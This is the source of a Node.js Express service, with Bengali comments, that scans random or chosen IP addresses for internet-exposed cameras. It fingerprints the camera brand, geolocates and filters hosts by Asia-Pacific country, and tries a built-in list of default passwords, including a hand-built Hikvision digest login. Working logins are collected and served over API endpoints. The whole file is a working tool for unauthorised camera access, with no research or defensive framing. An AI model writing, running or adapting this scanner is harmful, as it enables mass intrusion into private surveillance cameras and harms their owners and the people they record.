const express = require('express');
const cors = require('cors');
const net = require('net');
const http = require('http');
const crypto = require('crypto');

const app = express();
app.use(cors());
app.use(express.json());

// ========== কনফিগারেশন ==========
const PORTS = [80, 8080, 443, 554, 37777, 8000];
const TIMEOUT = 1500;
const MAX_CONCURRENT = 20;

const DEFAULT_CREDS = [
  { user: 'admin', pass: 'admin123' },
  { user: 'admin', pass: 'admin1234' },
  { user: 'admin', pass: '12345' },
  { user: 'admin', pass: 'password' },
  { user: 'admin', pass: '123456' },
  { user: 'root', pass: '12345' },
  { user: 'user', pass: 'user' },
  { user: 'admin', pass: 'Admin123' },
  { user: 'admin', pass: '12345678' },
  { user: 'admin', pass: '888888' },
  { user: 'admin', pass: '666666' },
];

const BRAND_SIGNATURES = [
  { pattern: /Hikvision/i, brand: 'Hikvision' },
  { pattern: /Dahua/i, brand: 'Dahua' },
  { pattern: /TP-Link/i, brand: 'TP-Link' },
  { pattern: /Xiaomi/i, brand: 'Xiaomi' },
  { pattern: /Axis/i, brand: 'Axis' },
  { pattern: /Sony/i, brand: 'Sony' },
  { pattern: /Panasonic/i, brand: 'Panasonic' },
  { pattern: /Bosch/i, brand: 'Bosch' },
  { pattern: /Samsung/i, brand: 'Samsung' },
  { pattern: /Vivotek/i, brand: 'Vivotek' },
];

// APNIC 44 দেশসমূহ
const ALL_COUNTRIES = [
  'BD','IN','CN','JP','SG','PK','AU','NZ','VN','TH','KR','MY','PH','ID',
  'LK','NP','KH','LA','MM','BN','PG','FJ','SB','VU','WS','TO','KI','TV',
  'MH','FM','PW','NR','CK','NU','TK','WF','AS','GU','MP','VI','PR','UM',
  'HK','MO','TW'
];

let foundCameras = [];
let validCameras = [];
let stats = { scanned: 0, found: 0 };

// ========== হেল্পার ==========
function randomIP() {
  return `${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
}

async function getGeo(ip) {
  try {
    const url = `http://ip-api.com/json/${ip}?fields=countryCode,city`;
    const data = await new Promise((resolve, reject) => {
      http.get(url, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try { resolve(JSON.parse(body)); } catch(e) { reject(e); }
        });
      }).on('error', reject);
    });
    if (data && data.countryCode) {
      return { country: data.countryCode, city: data.city || 'Unknown' };
    }
    return { country: 'XX', city: 'Unknown' };
  } catch {
    return { country: 'XX', city: 'Unknown' };
  }
}

function isPortOpen(ip, port) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    const timer = setTimeout(() => {
      socket.destroy();
      resolve(false);
    }, TIMEOUT);
    socket.on('connect', () => {
      clearTimeout(timer);
      socket.destroy();
      resolve(true);
    });
    socket.on('error', () => {
      clearTimeout(timer);
      resolve(false);
    });
    socket.connect(port, ip);
  });
}

function httpRequest(ip, port, path = '/', auth = null, method = 'GET') {
  return new Promise((resolve) => {
    const options = {
      hostname: ip,
      port: port,
      path: path,
      method: method,
      timeout: TIMEOUT,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    };
    if (auth) {
      options.headers['Authorization'] = 'Basic ' + Buffer.from(`${auth.user}:${auth.pass}`).toString('base64');
    }
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        resolve({ statusCode: res.statusCode, headers: res.headers, body: data });
      });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.end();
  });
}

async function tryHikvisionDigest(ip, port, cred) {
  try {
    const options = {
      hostname: ip,
      port: port,
      path: '/ISAPI/Security/userCheck',
      method: 'GET',
      timeout: TIMEOUT,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    };
    const challenge = await new Promise((resolve) => {
      const req = http.request(options, (res) => {
        const authHeader = res.headers['www-authenticate'];
        resolve(authHeader || null);
      });
      req.on('error', () => resolve(null));
      req.on('timeout', () => { req.destroy(); resolve(null); });
      req.end();
    });
    if (!challenge) return false;
    const realm = challenge.match(/realm="([^"]+)"/)?.[1] || '';
    const nonce = challenge.match(/nonce="([^"]+)"/)?.[1] || '';
    if (!realm || !nonce) return false;
    const uri = '/ISAPI/Security/userCheck';
    const nc = '00000001';
    const cnonce = 'abc123';
    const qop = 'auth';
    const ha1 = crypto.createHash('md5').update(`${cred.user}:${realm}:${cred.pass}`).digest('hex');
    const ha2 = crypto.createHash('md5').update(`GET:${uri}`).digest('hex');
    const response = crypto.createHash('md5').update(`${ha1}:${nonce}:${nc}:${cnonce}:${qop}:${ha2}`).digest('hex');
    const authHeader = `Digest username="${cred.user}", realm="${realm}", nonce="${nonce}", uri="${uri}", response="${response}", qop=${qop}, nc=${nc}, cnonce="${cnonce}"`;
    const authOptions = {
      hostname: ip,
      port: port,
      path: uri,
      method: 'GET',
      timeout: TIMEOUT,
      headers: {
        'Authorization': authHeader,
        'User-Agent': 'Mozilla/5.0'
      }
    };
    const result = await new Promise((resolve) => {
      const req = http.request(authOptions, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          resolve({ statusCode: res.statusCode, body: data });
        });
      });
      req.on('error', () => resolve(null));
      req.on('timeout', () => { req.destroy(); resolve(null); });
      req.end();
    });
    return result && result.statusCode === 200;
  } catch {
    return false;
  }
}

async function scanIP(ip, port, selectedCountries) {
  const open = await isPortOpen(ip, port);
  if (!open) return null;

  const response = await httpRequest(ip, port, '/');
  if (!response) return null;

  let brand = 'Unknown';
  const body = response.body || '';
  const serverHeader = response.headers?.server || '';
  const fullText = body + ' ' + serverHeader;
  for (const sig of BRAND_SIGNATURES) {
    if (sig.pattern.test(fullText)) {
      brand = sig.brand;
      break;
    }
  }

  const geo = await getGeo(ip);
  // কান্ট্রি ফিল্টার
  if (selectedCountries && selectedCountries.length > 0 && !selectedCountries.includes(geo.country)) {
    return null; // এই দেশ বাদ
  }

  let validCred = null;
  for (const cred of DEFAULT_CREDS) {
    let success = false;
    if (brand === 'Hikvision') {
      success = await tryHikvisionDigest(ip, port, cred);
    } else {
      const authRes = await httpRequest(ip, port, '/', cred);
      if (authRes && authRes.statusCode === 200) success = true;
    }
    if (success) {
      validCred = cred;
      break;
    }
  }

  return {
    ip,
    port,
    brand,
    geo: `${geo.country} (${geo.city})`,
    username: validCred ? validCred.user : null,
    password: validCred ? validCred.pass : null,
  };
}

async function scanIPs(ipList, selectedCountries = []) {
  const results = [];
  const chunks = [];
  for (let i = 0; i < ipList.length; i += MAX_CONCURRENT) {
    chunks.push(ipList.slice(i, i + MAX_CONCURRENT));
  }
  for (const chunk of chunks) {
    const promises = chunk.map(async (ip) => {
      for (const port of PORTS) {
        const cam = await scanIP(ip, port, selectedCountries);
        if (cam) {
          results.push(cam);
          foundCameras.push(cam);
          if (cam.username && cam.password) validCameras.push(cam);
          break;
        }
      }
      stats.scanned++;
    });
    await Promise.all(promises);
  }
  stats.found += results.length;
  return results;
}

// ========== API ==========
app.post('/api/scan/random', async (req, res) => {
  const { countries = [] } = req.body;
  const count = 15;
  const ips = Array.from({ length: count }, () => randomIP());
  const found = await scanIPs(ips, countries);
  res.json({ summary: `Scanned ${ips.length} IPs, found ${found.length} cameras.`, found, valid: validCameras, stats });
});

app.post('/api/scan/range', async (req, res) => {
  const { range, countries = [] } = req.body;
  if (!range) return res.status(400).json({ error: 'Range required' });
  let ips = [];
  try {
    if (range.includes('/')) {
      const base = range.split('/')[0];
      const parts = base.split('.');
      for (let i = 1; i <= 10; i++) ips.push(`${parts[0]}.${parts[1]}.${parts[2]}.${i}`);
    } else if (range.includes('-')) {
      const [start, end] = range.split('-');
      const startParts = start.split('.');
      const endParts = end.split('.');
      const sLast = parseInt(startParts[3]);
      const eLast = parseInt(endParts[3]);
      for (let i = sLast; i <= Math.min(eLast, sLast + 10); i++) {
        ips.push(`${startParts[0]}.${startParts[1]}.${startParts[2]}.${i}`);
      }
    } else {
      ips = [range];
    }
  } catch (e) {
    return res.status(400).json({ error: 'Invalid range format' });
  }
  const found = await scanIPs(ips, countries);
  res.json({ summary: `Scanned ${ips.length} IPs, found ${found.length}.`, found, valid: validCameras, stats });
});

app.post('/api/validate', async (req, res) => {
  const toValidate = foundCameras.filter(c => !c.username);
  const newlyValid = [];
  for (const cam of toValidate) {
    for (const cred of DEFAULT_CREDS) {
      let success = false;
      if (cam.brand === 'Hikvision') {
        success = await tryHikvisionDigest(cam.ip, cam.port, cred);
      } else {
        const authRes = await httpRequest(cam.ip, cam.port, '/', cred);
        if (authRes && authRes.statusCode === 200) success = true;
      }
      if (success) {
        cam.username = cred.user;
        cam.password = cred.pass;
        validCameras.push(cam);
        newlyValid.push(cam);
        break;
      }
    }
  }
  res.json({ valid: newlyValid, stats });
});

app.get('/api/valid/list', (req, res) => {
  res.json({ valid: validCameras, stats });
});

app.post('/api/clear', (req, res) => {
  foundCameras = [];
  validCameras = [];
  stats = { scanned: 0, found: 0 };
  res.json({ success: true });
});

module.exports = app;
